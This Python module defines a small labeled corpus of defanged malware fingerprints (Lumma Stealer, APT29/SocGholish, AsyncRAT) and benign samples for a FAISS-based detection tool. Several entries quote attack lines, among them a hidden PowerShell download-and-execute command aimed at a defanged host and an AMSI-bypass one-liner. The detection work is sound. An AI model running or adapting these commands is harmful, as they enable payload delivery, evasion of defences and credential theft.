"""
Built-in labeled reference corpus that the real FAISS clustering searches against.

These are short, DEFANGED, non-executable descriptive snippets that capture the
*behavioral fingerprint* of a few well-known families (Lumma Stealer, APT29 /
SocGholish, AsyncRAT) plus benign baselines. They are detection-context strings —
not live malware — so a query embedding can find a genuine nearest neighbor and a
benign file can score legitimately low.

Grow the corpus by appending entries here, or mount a larger labeled set via the
FAISS index volume (see clustering.py). Keep entries short (a handful of lines).
"""
from __future__ import annotations

from typing import Dict, List

# Each entry: display ``sample`` name, threat ``family`` (== attribution actor),
# and a defanged behavioral ``text`` snippet.
TEXT_CORPUS: List[Dict[str, str]] = [
    # --- Lumma Stealer (ClickFix / fake-CAPTCHA → PowerShell loader → stealer) ---
    {
        "sample": "Lumma ClickFix lure",
        "family": "Lumma Stealer",
        "text": "Verify you are human. Press Win+R, then Ctrl+V and Enter to finish the CAPTCHA. "
        "Clipboard is silently set to a hidden PowerShell command that contacts the C2.",
    },
    {
        "sample": "Lumma PowerShell loader",
        "family": "Lumma Stealer",
        "text": "powershell -w hidden -nop iex (new-object net.webclient)."
        "downloadstring('hxxps://lumma-gate[.]xyz/load'); downloads norm4[.]zip and runs NetVineSigned.exe",
    },
    {
        "sample": "Lumma stealer exfil",
        "family": "Lumma Stealer",
        "text": "Stealer collects Chrome/Firefox cookies, autofill, saved passwords and crypto wallets; "
        "exfiltrates browser logs to C2 45.137.21[.]9 over HTTP POST.",
    },
    # --- APT29 / SocGholish (fake browser-update drive-by) ----------------------
    {
        "sample": "SocGholish fake update",
        "family": "APT29",
        "text": "Injected document.write banner: 'Your Chrome is out of date. Update now' serves Update.js "
        "from compromised site via secure-update-cdn[.]com fakeupdate framework.",
    },
    {
        "sample": "APT29 staged loader",
        "family": "APT29",
        "text": "Invoke-WebRequest -Uri hxxps://185.220.101[.]47/jquery.min.js?id= -OutFile loader; "
        "second stage via rundll32 with WMI event-subscription persistence.",
    },
    {
        "sample": "APT29 WMI persistence",
        "family": "APT29",
        "text": "Cozy Bear style: scheduled task plus WMI __EventFilter CommandLineEventConsumer for "
        "stealthy persistence; low-and-slow beaconing to staging infrastructure.",
    },
    # --- AsyncRAT ----------------------------------------------------------------
    {
        "sample": "AsyncRAT config",
        "family": "AsyncRAT",
        "text": "AsyncRAT .NET remote access trojan: C2 pulled from pastebin, mutex AsyncMutex_6SI8OkPnk, "
        "schtasks /create for persistence, panel at asyncrat-panel[.]net.",
    },
    {
        "sample": "AsyncRAT AMSI bypass",
        "family": "AsyncRAT",
        "text": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed') "
        "SetValue true to disable AMSI before loading the RAT payload.",
    },
    {
        "sample": "AsyncRAT injection",
        "family": "AsyncRAT",
        "text": "VirtualAlloc + WriteProcessMemory + CreateRemoteThread process injection into msbuild.exe; "
        "reflective .NET loader for the RAT.",
    },
    # --- Benign baselines (so similarity can be genuinely low) -------------------
    {
        "sample": "Benign frontend build",
        "family": "Benign",
        "text": "npm run build runs vite build and emits the production React bundle to dist/. "
        "Standard CI step, no network beacons.",
    },
    {
        "sample": "Benign backup script",
        "family": "Benign",
        "text": "#!/bin/bash rsync -a /home/user/data /backup/daily — nightly cron backup of user files to "
        "a local backup directory.",
    },
    {
        "sample": "Benign data analysis",
        "family": "Benign",
        "text": "import pandas as pd; df = pd.read_csv('sales.csv'); print(df.groupby('region').sum()) — "
        "routine analytics notebook over a local CSV.",
    },
    {
        "sample": "Benign project readme",
        "family": "Benign",
        "text": "This project provides a REST API for managing a personal book library, with endpoints to "
        "add, list and search books. MIT licensed.",
    },
    {
        "sample": "Benign SQL report",
        "family": "Benign",
        "text": "SELECT order_id, total FROM orders WHERE created_at > '2024-01-01' ORDER BY total DESC — "
        "monthly sales reporting query.",
    },
]
